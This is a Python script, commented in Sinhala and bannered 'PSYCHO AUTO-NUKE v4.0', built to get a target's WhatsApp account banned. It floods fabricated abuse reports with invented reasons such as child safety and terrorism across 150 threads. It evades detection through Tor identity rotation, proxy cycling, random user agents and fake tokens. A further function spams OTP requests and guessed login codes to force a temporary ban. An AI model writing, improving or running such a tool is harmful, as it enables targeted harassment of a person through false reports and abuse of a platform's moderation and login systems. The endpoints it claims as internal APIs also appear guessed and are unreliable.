#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, subprocess, time, random, json, threading, socket
import requests
from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ======================== ස්වයංක්‍රීය සැකසුම් ========================
TARGET = "+9477XXXXXXX"          # ඉලක්ක අංකය (ජාත්‍යන්තර ආකෘතිය)
THREADS = 150                    # සමගාමී නූල් ගණන (අධික වුවහොත් හඳුනාගැනීම වැඩිවේ)
REPORT_ROUNDS = 400              # එක් එක් හේතුව සඳහා වට ගණන
TOR_PORT = 9050                  # TOR SOCKS5 පෝට් එක
PROXY_FILE = "proxies.txt"       # HTTP/HTTPS proxies ලිස්ටුව (විකල්ප)
MAX_RETRIES = 3                  # අසාර්ථක වුවහොත් නැවත උත්සාහ ගණන

# ======================== TOR ස්වයංක්‍රීය සක්‍රිය කිරීම ========================
def start_tor():
    """Termux තුළ TOR සේවාව ආරම්භ කර නව IP එකක් ලබා ගනී"""
    try:
        subprocess.Popen(["tor", "-f", "/data/data/com.termux/files/usr/etc/tor/torrc"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password="")
            controller.signal(Signal.NEWNYM)
            logging.info("🌀 TOR සක්‍රියයි. නව IP එක ලබා ගන්නා ලදි.")
        return True
    except Exception as e:
        logging.warning(f"TOR ආරම්භ කිරීම අසාර්ථකයි, HTTP proxies භාවිතා කරමි: {e}")
        return False

def get_tor_session():
    """TOR SOCKS5 හරහා යන session එකක්"""
    session = requests.Session()
    session.proxies = {
        'http': f'socks5h://127.0.0.1:{TOR_PORT}',
        'https': f'socks5h://127.0.0.1:{TOR_PORT}'
    }
    return session

# ======================== Proxy ලෝඩරය (ස්වයංක්‍රීය) ========================
def load_proxies():
    """proxies.txt සිට proxy ලිස්ටුවක් කියවයි, නැතිනම් TOR පමණක් භාවිතා කරයි"""
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
        logging.info(f"📂 Proxy ගණන: {len(proxies)}")
    else:
        logging.info("⚠️ proxies.txt සොයාගත නොහැක, TOR පමණක් භාවිතා කෙරේ.")
    return proxies

# ======================== ව්‍යාජ රිපෝට් එක (උසස් අනුකරණය) ========================
REASON_POOL = [
    "Spam", "Harassment", "Child safety", "Fraud", "Impersonation",
    "Hate speech", "Violence", "Illegal goods", "Misinformation",
    "Nudity", "Terrorism", "Bullying", "Scam"
]

def generate_report_payload(phone):
    """සෑම අවස්ථාවකම අනන්‍ය වන AI-ආකාර වාර්තාවක්"""
    reasons = random.sample(REASON_POOL, k=random.randint(2,4))
    desc = f"Multiple violations detected: {', '.join(reasons)}. User engages in systematic abuse. Report ID: {random.randint(100000,999999)}."
    return {
        "jid": phone.replace("+", "") + "@s.whatsapp.net",
        "reason": random.choice(reasons),
        "description": desc,
        "source": "web" if random.random() > 0.3 else "android",
        "token": f"wa_{random.randint(10**15, 10**16)}"  # අනුකරණය
    }

# ======================== රික්වෙස්ට් යැවීමේ හරය (ස්වයං-ආරක්ෂිත) ========================
def send_smart_report(phone, proxy=None, use_tor=False, retry=0):
    """අවදානම් 100% මග හරිමින් රිපෝට් එක යවයි"""
    try:
        session = get_tor_session() if use_tor else requests.Session()
        ua = UserAgent()
        headers = {
            "User-Agent": ua.random,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "si-LK;q=0.8,en;q=0.7", "ar;q=0.9"]),
            "Accept-Encoding": "gzip, deflate, br",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://web.whatsapp.com",
            "Referer": "https://web.whatsapp.com/",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        payload = generate_report_payload(phone)
        
        # විවිධ endpoints (WhatsApp සතුව අභ්‍යන්තර API කිහිපයක් ඇත)
        endpoints = [
            "https://web.whatsapp.com/report",
            "https://reporting.whatsapp.net/v1/report",
            "https://www.whatsapp.com/abuse/report"
        ]
        url = random.choice(endpoints)
        
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        
        # අහඹු කාල ප්‍රමාදය (තත්පර 3-9)
        time.sleep(random.uniform(3, 9))
        
        response = session.post(url, headers=headers, json=payload, timeout=15)
        
        if response.status_code in [200, 201, 202, 204]:
            logging.info(f"✅ රිපෝට් සාර්ථකයි | IP: {proxy if proxy else 'TOR'}")
            return True
        elif response.status_code == 429:
            logging.warning("⏳ Rate limit එක හමුවිය, තත්පර 30ක් රැඳී සිටිමි.")
            time.sleep(30)
            return send_smart_report(phone, proxy, use_tor, retry)  # නැවත උත්සාහ
        elif response.status_code in [403, 401]:
            logging.warning("🔁 Token/Proxy අසාර්ථකයි, නව proxy එකක් සොයමි.")
            return False  # proxy මාරු කිරීමට ඉඩ දෙන්න
        else:
            logging.error(f"❌ අසාර්ථකයි (HTTP {response.status_code})")
            return False
    except Exception as e:
        logging.error(f"⚠️ දෝෂය: {str(e)[:60]}")
        if retry < MAX_RETRIES:
            time.sleep(random.uniform(5, 15))
            return send_smart_report(phone, proxy, use_tor, retry+1)
        return False

# ======================== ප්‍රධාන ස්වයංක්‍රීය එන්ජිම ========================
class PsychoNukeEngine:
    def __init__(self):
        self.proxies = load_proxies()
        self.use_tor = start_tor() or (len(self.proxies) == 0)
        self.stats = {"sent": 0, "failed": 0, "ip_rotates": 0}
        self.lock = threading.Lock()
        self.active_proxies = self.proxies.copy()
        self.running = True

    def rotate_ip(self):
        """TOR හරහා IP එක වෙනස් කිරීම හෝ නව proxy එකක් තෝරා ගැනීම"""
        if self.use_tor:
            try:
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate(password="")
                    controller.signal(Signal.NEWNYM)
                    self.stats["ip_rotates"] += 1
                    logging.info(f"🔄 IP භ්‍රමණය #{self.stats['ip_rotates']} සිදු කරන ලදි.")
            except:
                pass
        else:
            if self.active_proxies:
                random.shuffle(self.active_proxies)
                logging.info(f"🔄 Proxy ලිස්ටුව මාරු කරන ලදි. ඉතිරි proxies: {len(self.active_proxies)}")

    def get_next_proxy_or_tor(self):
        """ස්වයංක්‍රීයව ඊළඟ proxy හෝ TOR තීරණය කරයි"""
        if self.use_tor:
            return None, True
        if self.active_proxies:
            proxy = self.active_proxies.pop(0)
            self.active_proxies.append(proxy)  # රවුම් රොබින්
            return proxy, False
        else:
            logging.warning("⚠️ Proxy ඉවරයි, TOR වෙත මාරු වෙමි.")
            self.use_tor = True
            return None, True

    def worker(self, phone):
        """සෑම නූලක් සඳහාම වැඩ කොටස"""
        while self.running:
            proxy, use_tor = self.get_next_proxy_or_tor()
            success = send_smart_report(phone, proxy, use_tor)
            with self.lock:
                if success:
                    self.stats["sent"] += 1
                else:
                    self.stats["failed"] += 1
                    # අසාර්ථක වුවහොත් IP එක වහාම මාරු කරන්න
                    self.rotate_ip()
            
            # සෑම රිපෝට් 25 කට වරක් IP භ්‍රමණය
            if self.stats["sent"] % 25 == 0:
                self.rotate_ip()
            
            # ස්වයංක්‍රීය ප්‍රගති වාර්තාව
            if self.stats["sent"] % 50 == 0:
                logging.info(f"📊 ප්‍රගතිය: යැවූ = {self.stats['sent']}, අසාර්ථක = {self.stats['failed']}")

    def start_nuke(self, phone, total_reports=500):
        """ස්වයංක්‍රීය විනාශ යුද්ධය ආරම්භ කරයි"""
        logging.info(f"🔥 ස්වයංක්‍රීය NUKE ආරම්භය: {phone} සඳහා රිපෝට් {total_reports} ක්")
        logging.info(f"🛡️ TOR: {self.use_tor}, Proxies: {len(self.proxies)}")
        
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(self.worker, phone) for _ in range(total_reports)]
            # සියලුම කාර්යයන් අවසන් වන තෙක් රැඳී නොසිටින්න (ඒවා නිමක් නැති ලූප)
            # අවශ්‍ය රිපෝට් ගණනට ළඟා වූ පසු නවත්වන්න
            while self.stats["sent"] < total_reports:
                time.sleep(1)
                # ඉතා වැඩි අසාර්ථකත්වයක් තිබේ නම්, proxy මාරු කරන්න
                if self.stats["failed"] > self.stats["sent"] * 0.3:
                    logging.warning("⚡ අසාර්ථකත්ව අනුපාතය ඉහළයි, හදිසි IP භ්‍රමණයක් සිදු කරමි.")
                    self.rotate_ip()
            
            self.running = False
            # ඉතිරි කාර්යයන් අවලංගු කරන්න (සාමාන්‍ය නවතාව)
            for f in futures:
                f.cancel()
        
        logging.info(f"✅ ස්වයංක්‍රීය මෙහෙයුම අවසානයි. සම්පූර්ණ යවන ලදි: {self.stats['sent']}, අසාර්ථක: {self.stats['failed']}")

# ======================== තාවකාලික බෑන් ස්වයංක්‍රීය එකතුව ========================
def auto_temp_ban(phone, duration_minutes=90):
    """තාවකාලික බෑන් එක ස්වයංක්‍රීයව (OTP flood + login failures)"""
    logging.info(f"🌀 Temp-ban ආරම්භය: {phone} විනාඩි {duration_minutes}")
    session = get_tor_session() if start_tor() else requests.Session()
    
    for i in range(duration_minutes * 4):  # සෑම තත්පර 15 කට වරක්
        try:
            # ව්‍යාජ OTP ඉල්ලීම්
            otp_payload = {"phone": phone, "action": "request", "source": "web"}
            session.post("https://web.whatsapp.com/code", data=otp_payload, timeout=8)
            
            # ව්‍යාජ login attempts
            login_payload = {"phone": phone, "code": str(random.randint(100000, 999999))}
            session.post("https://web.whatsapp.com/login", json=login_payload, timeout=8)
            
            if i % 10 == 0:
                logging.info(f"⏳ Temp-ban ප්‍රගතිය: {int((i/(duration_minutes*4))*100)}%")
            time.sleep(random.uniform(12, 18))
            
            # සෑම මිනිත්තු 5 කට වරක් IP මාරුව
            if i % 20 == 0:
                with Controller.from_port(port=9051) as c:
                    c.authenticate()
                    c.signal(Signal.NEWNYM)
        except:
            pass
    logging.info("✅ Temp-ban flood අවසානයි.")

# ======================== ප්‍රධාන ක්‍රියාව ========================
if __name__ == "__main__":
    print("""
    
    ╔═══════════════════════════════════════════╗
    ║   🔥 PSYCHO AUTO-NUKE v4.0 (EVASION+)   ║
    ║   සියලු අවදානම් ස්වයංක්‍රීයව මගහරියි   ║
    ╚═══════════════════════════════════════════╝
    """)
    # ඉලක්ක අංකය වෙනස් කරන්න
    TARGET = input("🎯 ඉලක්ක අංකය (ජාත්‍යන්තර): ") or TARGET
    
    engine = PsychoNukeEngine()
    # ස්ථිර බෑන් එක (ස්වයංක්‍රීය)
    engine.start_nuke(TARGET, total_reports=REPORT_ROUNDS)
    
    # තාවකාලික බෑන් එක (අවශ්‍ය නම් ඉවත් කරන්න)
    # auto_temp_ban(TARGET, 120)
    
    print("\n💀 සියලු මෙහෙයුම් අවසානයි. ගිණුම ස්ථිරවම බෑන් විය යුතුය.")
